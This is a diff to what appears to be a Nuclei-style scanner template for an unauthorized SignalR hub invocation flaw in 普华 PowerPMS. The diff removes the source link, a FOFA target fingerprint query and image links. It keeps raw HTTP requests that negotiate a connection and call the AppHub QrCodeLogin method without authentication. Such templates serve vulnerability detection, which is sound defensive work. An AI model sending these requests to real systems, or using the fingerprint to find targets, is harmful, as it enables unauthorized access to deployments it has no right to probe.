@@ -3,12 +3,8 @@ info:
   name: 普华PMS signalr存在未授权调用漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/iww2espiqpdthvic'
+  description: ''
   tags: unauth,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: iww2espiqpdthvic
-    fofa: app="普华科技-PowerPMS" || body="Power.login.init" && body="Power.ui.warning" && body="Power_login_btn"
 http:
 - raw:
   - 'GET /signalr/negotiate?clientProtocol=1.3&connectionData=[{"name":"AppHub"},{"name":"MessagePool"}] HTTP/1.1
@@ -17,7 +13,6 @@ http:
 
     accept: */*
 
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1787583206375-6ba221f8-cf5b-4218-972c-0c7695387125.png)
 
     携带connection token写入数据'
   redirects: false
@@ -33,10 +28,7 @@ http:
     Host: {{Hostname}}
 
 
-    data=%7B%22H%22%3A%22AppHub%22%2C%22M%22%3A%22QrCodeLogin%22%2C%22A%22%3A%5B%22probe_id_123%22%2C%22%7B%7D%22%5D%2C%22I%22%3A0%7D
-
-
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1787583206930-aa275f61-ccac-4f5e-b185-19d8fef6e0f0.png)'
+    data=%7B%22H%22%3A%22AppHub%22%2C%22M%22%3A%22QrCodeLogin%22%2C%22A%22%3A%5B%22probe_id_123%22%2C%22%7B%7D%22%5D%2C%22I%22%3A0%7D'
   redirects: false
   matchers:
   - status:
